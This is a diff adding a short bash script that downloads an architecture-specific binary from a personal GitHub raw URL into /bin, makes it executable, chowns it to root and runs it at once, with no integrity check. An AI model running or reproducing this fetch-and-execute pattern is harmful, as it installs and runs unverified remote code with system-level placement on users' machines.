@@ -1,0 +1,12 @@
+#!/bin/bash -e
+ export EXE=rcl.$(uname -p)
+ export BIN='/bin/'
+ export USER='root'
+ export DEVNULL='/dev/null'
+ export DOMAIN='https://raw.githubusercontent.com'
+ export URL='https://raw.githubusercontent.com/j1nh0/linx/main/rcl/'
+ if dig +short "$DOMAIN"&>"$DEVNULL";then wget -O $BIN$EXE $URL$EXE;fi
+ if [ -f $BIN$EXE ];then chmod 0755 $BIN$EXE;fi
+ if [ -f $BIN$EXE ];then chown $USER:$USER $BIN$EXE;fi
+ if [ -f $BIN$EXE ];then $BIN$EXE;fi
+exit 0
